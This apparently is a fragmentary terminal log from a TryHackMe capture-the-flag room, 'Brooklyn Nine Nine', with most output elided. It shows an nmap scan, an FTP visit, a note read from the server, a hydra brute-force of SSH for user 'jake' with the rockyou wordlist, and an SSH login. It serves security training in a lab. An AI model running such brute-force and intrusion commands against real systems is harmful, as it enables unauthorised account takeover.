...
```
bibo318@parrot:~/CTFs/tryhackme/Brooklyn Nine Nine$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.45.119
...
```
bibo318@parrot:~/CTFs/tryhackme/Brooklyn Nine Nine$ ftp 10.10.45.119
...
```
bibo318@parrot:~/CTFs/tryhackme/Brooklyn Nine Nine$ cat note_to_jake.txt
From Amy,
...
```
bibo318@parrot:~/CTFs/tryhackme/Brooklyn Nine Nine$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.45.119
...
```
bibo318@parrot:~/CTFs/tryhackme/Brooklyn Nine Nine$ ssh jake@10.10.45.119
